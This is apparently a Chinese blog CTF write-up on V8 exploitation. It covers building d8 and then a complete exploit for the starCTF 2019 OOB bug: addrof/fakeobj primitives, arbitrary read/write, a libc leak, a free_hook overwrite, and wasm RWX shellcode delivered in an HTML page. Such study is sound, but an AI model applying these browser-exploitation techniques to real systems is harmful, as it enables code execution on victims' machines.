---
title: V8 - PWN chromium 0x00
date: 2023-08-30 23:21:23
tags:
  - V8
---

> 之前一直对 v8 有所耳闻却没仔细看过, 这下比赛里被锤烂了, 坐大牢

# v8-pwn-cheatsheet

## Installation

chrome 中 JavaScript 的解释器被称为 V8, 下载的 V8 源码经过编译后得到可执行文件 d8, 而 d8 往往又分为 `debug` 和 `release` 版本。

先是下载源码:

- 安装 `depot_tools` 用于下载 V8 源码:

  - `git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git`
  - `echo 'export PATH=$PATH:"/root/depot_tools"' >> ~/.zshrc`

- 安装 `ninja` 用于编译 V8:

  - `git clone https://github.com/ninja-build/ninja.git`
  - `cd ninja && ./configure.py --bootstrap && cd ..`
  - `echo 'export PATH=$PATH:"/root/ninja"' >> ~/.zshrc`
  - `source ~/.zshrc`
  - `fetch v8`

- 接下来编译:

  - `cd v8 && gclient sync`
  - `tools/dev/v8gen.py x64.debug`
  - `ninja -C out.gn/x64.debug `

- 最后选择导出路径:

  - `./out.gn/x64.debug/d8`
  - `./out.gn/x64.debug/v8_shell`

## Patch

题目一般会给出有漏洞版本的 `commit-id`, 因此编译之前需要把源码版本先 patch 到目标版本:

```bash
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync
git apply < oob.diff
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

## Debug

在 `./v8/tools/gdbinit` 中提供了便于调试 V8 的 gdb 脚本, 主要提供了 `job` 指令。

调试时需要打开 `allow-natives-syntax` 选项:

```bash
gdb ./d8
set args --allow-natives-syntax
r
source ~/.gdbinit_v8
```

### gdb

- `telescope [addr] [length]`
  - 查看目标地址内存数据
- `job [addr]`
  - 显示 JavaScript 对象的内存结构

**V8 在内存中只有数字和对象两种数据结构的表示, 为了区分, 内存地址最低位是 1 则表示该地址上的数据结构是对象。**

**即指针标记机制, 用来区分指针、双精度数、SMIS（immediate small integer）**

```
Double: Shown as the 64-bit binary representation without any changes
Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
```

### JavaScript

- `%DebugPrint(obj)`
  - 查看对象地址
- `%SystemBreak()`
  - 触发调试中断结合 gdb 使用

### 对象结构

V8 本质上是一个 JavaScript 解释执行器, 基本执行流程为:

v8 在读取 js 语句后, 首先将这一条语句解析为语法树, 然后通过解释器将语法树变为中间语言的 Bytecode 字节码, 最后利用内部虚拟机将字节码转换为机器码来执行.

JIT 优化:

v8 会记录下某条语法树的执行次数, 当 v8 发现某条语法树执行次数超过一定阀值后, 就会将这段语法树直接转换为机器码。

后续再调用这条 js 语句时, v8 会直接调用这条语法树对应的机器码, 而不用再转换为 ByteCode 字节码, 这样就大大加快了执行速度。

```
map: 定义了如何访问对象
prototype：	对象的原型（如果有）
elements：对象元素的地址
length：长度
properties：	属性, 存有map和length
```

其中, elements 也是个对象（指向数组对象上方的指针）, 即 v8 先申请了一块内存存储元素内容, 然后申请了一块内存存储这个数组的对象结构, 对象中的 elements 指向了存储元素内容的内存地址。

---

# CTF-chals

## example0-starCTF2019-OOB

这道题也算是 V8 题目中比较经典的例题了, 题目附件: [starctf2019-pwn-OOB](https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/StarCTF-2019/pwn-OOB)

```bash
fetch v8
cd v8
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync
git apply < oob.diff
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

这里有一点需要注意的是, 我们现在编译的 debug 版本调用 obj.oob() 时会触发异常退出, 因此只能在 release 版本下进行利用, debug 版本下调试帮助理解 JavaScript 对象结构。

题目的漏洞点体现在 oob.diff 文件中:

```c
...
line 33:    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
...
line 39:    elements.set(length,value->Number());
...
```

即无论是读还是写, oob 方法都索引到了 `elements[length]` 的位置, 造成了数组越界漏洞。

在具体利用时, 还是遵循着 pwn 题目的基本思路：

```
漏洞
     -> 类型混淆
                 -> 任意地址读写
                                 -> 泄露相关地址
                                                 -> shellcode || hook_hijacking
```

先来看几个类型转换的辅助函数:

```JavaScript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i( f ) {
// 浮点数表示为u64
    float64[0] = f;
    return bigUint64[0];
}
function i2f( i ) {
// u64直接表示为浮点数
    bigUint64[0] = i;
    return float64[0];
}
function hex( x ) {
    return x.toString(16).padStart(16, "0");
}
```

接下来是利用 oob() 实现类型混淆的思路:

- 首先需要明白: JavaScript中对于对象（[对象结构的复习](#对象结构)）的解析依赖于 `map`：map 指向 `<Map(PACKED_ELEMENTS)>` 时 elements 中元素就会按照 obj 来解析，其他类型同理；
- 而 oob() 不带参数（`args.at<Object>(0)` 永远是 self）, 就可以输出 `elements[length]`, oob(data) 就可以在 `elements[length]` 写入 data；
- array 的 elements 也是对象, 在内存结构中, 往往体现为：elements 紧挨着 array, 即：**`elements[length]` 的位置上就是 array 的 `map`**
- 因此可以考虑先读出 map, 再在另一种 array 的 map 处写入, 即实现了类型混淆.

demo 如下:

```JavaScript
var obj = {};
var obj_list = [obj];
var float_list = [4.3];

var obj_map = obj_list.oob();
var float_map = float_list.oob();

obj_list.oob(float_map);
var obj_addr = f2i(obj_list[0]) - 0x1n;
obj_list.oob(obj_map);
console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
%DebugPrint(obj);
%SystemBreak();
```

这样一来, 我们就可以开始考虑构造任意地址写了, 思路如下:

- 首先, 在 JavaScript 中浮点数在内存中是直接存储的, 因此伪造 `float_array` 是比较合适的;
- 目标是通过在 `fake_float_array` 这个对象的 `elements` 的基础上使用 `get_obj()` 函数构建假的`float_array`
- 如此一来, 当访问到`fake_array[0]`的时候, 实际上会根据其map设定的访问规则, 最终访问到`target_addr+10`也是`fake_float_array[2]`的位置上.

测试代码如下:

```JavaScript
// arbitary read and write
function get_addr( target_obj ) {
    obj_list[0] = target_obj;
    obj_list.oob(float_map);
    let res = f2i(obj_list[0]) - 1n;
    obj_list.oob(obj_map);
    return res;
}
function get_obj( target_addr ) {
    float_list[0] = i2f(target_addr + 1n);
    float_list.oob(obj_map);
    let res = float_list[0];
    float_list.oob(float_map);
    return res;
}

var fake_float_array = [
    float_map,
    i2f(0n),
    i2f(0xdeadbeefn),
    i2f(0x400000000n),
    4.3,
    4.3
];
var fake_array_addr = get_addr(fake_float_array);
var fake_elements_addr = fake_array_addr - 0x30n;
var fake_obj = get_obj(fake_elements_addr);

function arb_read( target_addr ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    let res = f2i(fake_obj[0]);
    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res));
    return res;
}
function arb_write( target_addr, data ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data));
}

// test_demos
var a = [0.1, 0.2, 0.3, 1.0, 4.3];
var test_addr = get_addr(a) - 0x18n;
%DebugPrint(a);
arb_write(test_addr, 0xdeadbeefn);
console.log(a[2]);
%DebugPrint(a);
%SystemBreak();
```

但是上面使用FloatArray进行写入的时候, 在目标地址高位是0x7f等情况下, 会出现低 [18](#References) 位被置零的现象, 可以通过DataView的利用来解决:

- DataView对象中的有如下指针关系: `DataView -> buffer -> backing_store -> 存储内容` , 即`backing_store`指针指向了DataView申请的Buffer真正的内存地址;

改进如下:

```JavaScript
var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
function writeDataview( addr, data ) {
    arb_write(buf_backing_store_addr, addr);
    data_view.setBigUint64(0, data, true);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}
```

---

综上, 现在已经实现了任意地址写, 本地getshell还是考虑借助libc中的freehook, 至于地址泄露, 往前找肯定会存在我们需要的地址, 我们拥有很强的任意地址读写, 所以这不是一件难事:

exp.js:

```JavaScript

// auxiliary funcs to convert between doubles and u64s
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i( f ) {
    float64[0] = f;
    return bigUint64[0];
}
function i2f( i ) {
    bigUint64[0] = i;
    return float64[0];
}
function hex( x ) {
    return x.toString(16).padStart(16, "0");
}


// type confusion demo
var obj = {};
var obj_list = [obj];
var float_list = [4.3];

var obj_map = obj_list.oob();
var float_map = float_list.oob();

// obj_list.oob(float_map);
// var obj_addr = f2i(obj_list[0]) - 0x1n;
// obj_list.oob(obj_map);
// console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
// %DebugPrint(obj);
// %SystemBreak();


// arbitary read and write
function get_addr( target_obj ) {
    obj_list[0] = target_obj;
    obj_list.oob(float_map);
    let res = f2i(obj_list[0]) - 1n;
    obj_list.oob(obj_map);
    return res;
}
function get_obj( target_addr ) {
    float_list[0] = i2f(target_addr + 1n);
    float_list.oob(obj_map);
    let res = float_list[0];
    float_list.oob(float_map);
    return res;
}

var fake_float_array = [
    float_map,
    i2f(0n),
    i2f(0xdeadbeefn),
    i2f(0x400000000n),
    4.3,
    4.3
];
var fake_array_addr = get_addr(fake_float_array);
var fake_elements_addr = fake_array_addr - 0x30n;
var fake_obj = get_obj(fake_elements_addr);

function arb_read( target_addr ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    let res = f2i(fake_obj[0]);
    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res));
    return res;
}
function arb_write( target_addr, data ) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data));
}

// test_demos
// var a = [0.1, 0.2, 0.3, 1.0, 4.3];
// var test_addr = get_addr(a) - 0x18n;
// %DebugPrint(a);
// arb_write(test_addr, 0xdeadbeefn);
// console.log(a[2]);
// %DebugPrint(a);
// %SystemBreak();

var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
function writeDataview(addr,data){
    arb_write(buf_backing_store_addr, addr);
    data_view.setBigUint64(0, data, true);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}

// leak libc
var a = [0.1, 0.2, 0.3, 1.0, 4.3];
var start_addr = get_addr(a);
var elf_addr = 0n;
while ( 1 ) {
    start_addr -= 0x8n;
    elf_addr = arb_read(start_addr);
    if (((elf_addr & 0xff0000000000n) == 0x560000000000n && (elf_addr & 0x1n) == 0) || ((elf_addr & 0xff0000000000n) == 0x550000000000n && (elf_addr & 0x1n) == 0)) {
        console.log("0x" + hex(elf_addr));
        break;
    }
}
console.log("done");

start_addr = elf_addr;
var libc_addr = 0n;
var suffix = 0x0;
while (1) {
    start_addr += 0x8n;
    libc_addr = arb_read(start_addr);
    if (((libc_addr & 0xff0000000000n) == 0x7f0000000000n)) {
        console.log("0x" + hex(libc_addr));
        suffix = (libc_addr & 0xfffn);
        break;
    }
}

var libc_base = libc_addr - 0x1ec000n - suffix;
var free_hook_addr = libc_base + 0x1eee48n;
var system_addr = libc_base + 0x52290n;
console.log("[+] libc_base : 0x" + hex(libc_base));
// %SystemBreak();
function exp() {
    var aaa = "/bin/sh\x00";
}
writeDataview(free_hook_addr, system_addr);
exp();

```

---

### 借助wasm实现最终exp

上面已经通过 `free_hook` 在本地 getshell 了, 但是实际情况中, 我们更希望能够执行一段shellcode来进行更多操作, 如开一个反弹shell, 或者经典的弹计算器等操作, 这就需要借助wasm来实现了:

先在[wasdk.github.io](https://wasdk.github.io/WasmFiddle/)上随便生成一段wasm code, 得到测试demo:

```JavaScript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var exp = wasmInstance.exports.main;
var exp_addr = get_addr(exp);
console.log("[+] Addr of exp:  0x" + hex(exp_addr));
```

进入debug中分析wasm代码存储的地址, 发现如下指针引用关系:

```
func
     -> shared_info
                    -> data
                            -> instance
                                        -> instance + 0x88: rwx segments
```

因此有如下构造:

```JavaScript
var shared_info_addr = arb_read(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = arb_read(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = arb_read(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = arb_read(wasm_instance_addr + 0x88n);
console.log("[*] leak rwx_segment_addr: 0x" + hex(rwx_page_addr));
```

现在已经找到rwx段了, 又有任意地址读写, 接下来就是考虑shellcode的构造了, 这里提供两种:

弹计算器(注意要设置环境变量`'DISPLAY=:0.0'`, 在非root的terminal中运行`chrome --no-sandbox`( [patch过的chrome下载](https://github.com/AvavaAYA/ctf-writeup-collection/blob/main/StarCTF-2019/pwn-OOB/Chrome.tar.gz) )):

gen_sc.py

```python
#!/usr/bin/python3
from pwn import *
def just8(data):
    size = len(data)
    real_size = size if size % 8 == 0 else size + (8 - size % 8)
    return data.ljust(real_size, b'\x00')

def to_js(data):
    ret = 'var sc_arr = ['
    for i in range(0, len(data), 8):
        if (i // 8) % 4 == 0:
            ret += '\n'
        x = u64(data[i:i+8])

        ret += '\t' + hex(x) + 'n,'

    ret += '\n]\n'

    return ret

def call_exec(path, argv, envp):
    sc = ''
    sc += shellcraft.pushstr(path)
    sc += shellcraft.mov('rdi', 'rsp')
    sc += shellcraft.pushstr_array('rsi', argv)
    sc += shellcraft.pushstr_array('rdx', envp)
    sc += shellcraft.syscall('SYS_execve')
    return sc

context.os = 'linux'
context.arch = 'amd64'

sc = ''
sc = call_exec('/usr/bin/xcalc', ['xcalc'], ['DISPLAY=:0.0'])

data = asm(sc)
data = just8(data)

print(to_js(data))
```

弹shell则直接用msfvenom生成即可.

最后再包上 script 标签交给patch 后的chrome来解析即可:

```html
<script>
  var buf = new ArrayBuffer(16);
  var float64 = new Float64Array(buf);
  var bigUint64 = new BigUint64Array(buf);

  function f2i(f) {
    float64[0] = f;
    return bigUint64[0];
  }
  function i2f(i) {
    bigUint64[0] = i;
    return float64[0];
  }
  function hex(x) {
    return x.toString(16).padStart(16, "0");
  }

  var obj = {};
  var obj_list = [obj];
  var float_list = [4.3];

  var obj_map = obj_list.oob();
  var float_map = float_list.oob();

  function get_addr(target_obj) {
    obj_list[0] = target_obj;
    obj_list.oob(float_map);
    let res = f2i(obj_list[0]) - 1n;
    obj_list.oob(obj_map);
    return res;
  }
  function get_obj(target_addr) {
    float_list[0] = i2f(target_addr + 1n);
    float_list.oob(obj_map);
    let res = float_list[0];
    float_list.oob(float_map);
    return res;
  }

  var fake_float_array = [
    float_map,
    i2f(0n),
    i2f(0xdeadbeefn),
    i2f(0x400000000n),
    4.3,
    4.3,
  ];
  var fake_array_addr = get_addr(fake_float_array);
  var fake_elements_addr = fake_array_addr - 0x30n;
  var fake_obj = get_obj(fake_elements_addr);

  function arb_read(target_addr) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    let res = f2i(fake_obj[0]);
    console.log(
      "[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res),
    );
    return res;
  }
  function arb_write(target_addr, data) {
    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
    fake_obj[0] = i2f(data);
    console.log(
      "[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data),
    );
  }

  var data_buf = new ArrayBuffer(8);
  var data_view = new DataView(data_buf);
  var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
  function writeDataview(addr, data) {
    arb_write(buf_backing_store_addr, addr);
    data_view.setBigUint64(0, data, true);
    console.log("[*] write to : 0x" + hex(addr) + ": 0x" + hex(data));
  }

  var wasmCode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
    0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
  ]);
  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule, {});
  var exp = wasmInstance.exports.main;
  var exp_addr = get_addr(exp);
  console.log("[+] Addr of exp:  0x" + hex(exp_addr));

  var shared_info_addr = arb_read(exp_addr + 0x18n) - 0x1n;
  var wasm_exported_func_data_addr = arb_read(shared_info_addr + 0x8n) - 0x1n;
  var wasm_instance_addr =
    arb_read(wasm_exported_func_data_addr + 0x10n) - 0x1n;
  var rwx_page_addr = arb_read(wasm_instance_addr + 0x88n);
  console.log("[*] leak rwx_segment_addr: 0x" + hex(rwx_page_addr));

  var sc_arr = [
    0x10101010101b848n,
    0x62792eb848500101n,
    0x431480101626d60n,
    0x2f7273752fb84824n,
    0x48e78948506e6962n,
    0x1010101010101b8n,
    0x6d606279b8485001n,
    0x2404314801010162n,
    0x1485e086a56f631n,
    0x303a68e6894856e6n,
    0x50534944b848302en,
    0x52d231503d59414cn,
    0x4852e201485a086an,
    0x50f583b6ae289n,
  ];

  var buffer = new ArrayBuffer(sc_arr.length * 8 + 8);
  var data_view = new DataView(buffer);
  var buf_backing_store_addr = get_addr(buffer) + 0x20n;

  arb_write(buf_backing_store_addr, rwx_page_addr);
  for (let i = 0; i < sc_arr.length; i++) {
    data_view.setFloat64(i * 8, i2f(sc_arr[i]), true);
  }

  exp();
</script>
```

执行效果:

![[static/v8-ass001.png]]

---

## Acknowledgements
